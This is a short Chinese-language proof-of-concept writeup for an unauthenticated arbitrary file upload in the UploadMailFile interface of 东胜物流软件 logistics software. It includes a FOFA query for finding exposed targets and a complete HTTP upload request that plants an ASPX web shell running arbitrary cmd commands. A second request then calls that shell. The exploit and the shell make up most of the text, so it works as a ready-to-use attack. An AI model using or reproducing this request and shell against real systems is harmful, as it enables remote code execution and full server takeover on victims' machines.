## 东胜物流软件-UploadMailFile-任意文件上传漏洞

## 一、漏洞简介
东胜物流软件 UploadMailFile 接口存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa
```
app="东胜物流软件-物流软件"
```

## POC
```
POST /CommYng/Print/UploadMailFile HTTP/1.1
Host: [已模糊处理]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---WebKitFormBoundaryFfJZ4P1AZBixjELj
Accept: */*
Connection: close

-----WebKitFormBoundaryFfJZ4P1AZBixjELj
Content-Disposition: form-data; name="LoadFile"; filename="rce.aspx"
Content-Type: application/octet-stream

<%@ Page Language="Jscript" validateRequest="false"%>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c."+Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
Response.Write(out.ReadToEnd()+EI.ReadToEnd());
System.IO.File.Delete(Request.PhysicalPath);
Response.End();
%>
-----WebKitFormBoundaryFfJZ4P1AZBixjELj--
```

## POC
```
GET /UploadFiles/MailFile/20251128154558306rce.aspx?cmd=dir HTTP/1.1
Host: [已模糊处理]
```
